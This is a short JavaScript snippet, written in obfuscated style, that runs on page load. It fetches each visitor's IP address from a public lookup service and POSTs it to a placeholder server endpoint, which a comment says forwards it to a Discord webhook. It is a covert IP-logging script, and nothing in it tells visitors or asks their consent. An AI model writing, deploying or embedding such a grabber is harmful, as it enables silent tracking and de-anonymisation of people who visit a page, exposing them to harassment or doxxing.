const _0x3f2a = ['ipify', 'json', 'then', 'log', 'Visitor IP: ', 'YOUR_DISCORD_WEBHOOK_URL', 'POST', 'Content-Type', 'application/json', 'content'];

async function fetchAndSendIP() {
  try {
    // Fetch IP as plain text
    const ipResponse = await fetch(`https://api.${_0x3f2a[0]}.org?format=text`);
    const ip = await ipResponse.text();
    console.log(`${_0x3f2a[4]}${ip}`);

    // Send to Discord via a proxy (server-side)
    // Example: Replace _0x3f2a[5] with your server endpoint
    await fetch('YOUR_SERVER_ENDPOINT', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip })
    });
  } catch (error) {
    console.error('Error:', error);
  }
}

fetchAndSendIP();
